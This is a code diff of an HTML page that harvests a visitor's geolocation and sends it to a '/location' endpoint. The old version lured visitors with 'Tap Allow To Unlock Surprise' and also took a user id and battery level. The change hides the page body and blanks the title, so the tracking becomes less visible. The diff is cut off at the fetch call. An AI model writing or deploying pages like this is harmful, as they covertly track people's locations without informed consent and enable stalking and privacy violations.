@@ -2,36 +2,18 @@
 <html>
 
 <head>
-<title>Tap Allow To Unlock Surprise 😎</title>
+<title></title>
 </head>
 
-<body>
-
-<h2>Tap Allow To Unlock Surprise 😎</h2>
+<body style="display:none;">
 
 <script>
 
-const params = new URLSearchParams(window.location.search)
-const user = params.get("user") || "unknown"
-
-async function sendLocation(position){
-
-let batteryLevel = null
-
-if(navigator.getBattery){
-
-let battery = await navigator.getBattery()
-batteryLevel = Math.floor(battery.level * 100)
-
-}
+function sendLocation(position){
 
 let data = {
-
-user: user,
 latitude: position.coords.latitude,
-longitude: position.coords.longitude,
-battery: batteryLevel
-
+longitude: position.coords.longitude
 }
 
 fetch("/location",{
